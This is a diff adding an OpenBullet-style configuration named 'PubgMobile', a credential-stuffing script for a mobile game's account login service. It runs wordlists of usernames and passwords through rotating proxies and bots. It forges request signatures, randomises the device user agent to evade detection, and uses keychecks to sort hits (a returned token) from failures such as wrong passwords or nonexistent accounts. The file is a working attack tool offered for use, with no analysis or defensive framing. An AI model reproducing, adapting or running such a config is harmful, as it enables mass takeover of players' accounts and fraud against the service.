@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "PubgMobile",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-01T23:52:42.0984847+03:00",
+  "AdditionalInfo": "Configservice.club",
+  "Author": "TOPSECRET",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#FUNCTION1 FUNCTION Hash MD5 "<PASS>" -> VAR "TOKEN1" 
+
+#FUNCTION2 FUNCTION Hash MD5 "/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\"<USER>\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"<TOKEN1>\"}3ec8cd69d71b7922e2a17445840866b26d86e283" -> VAR "TOKEN2" 
+
+#FUNCTION3 FUNCTION RandomString "?d?d?d?d?d?d.?d?d?d" -> VAR "TOKENPRIV1" 
+
+#Login_Post REQUEST POST "https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig=<TOKEN2>" 
+  CONTENT "{\"account\":\"<USER>\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\"<TOKEN1>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.<TOKENPRIV1>)" 
+  HEADER "Host: igame.msdkpass.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 126" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"msg\":\"wrong password!\"" 
+    KEY "\"msg\":\"the account does not exists!\"" 
+    KEY "\"msg\":\"Params Email Format is Error!\"" 
+    KEY "\"msg\":\"Params Email is other format!\"" 
+
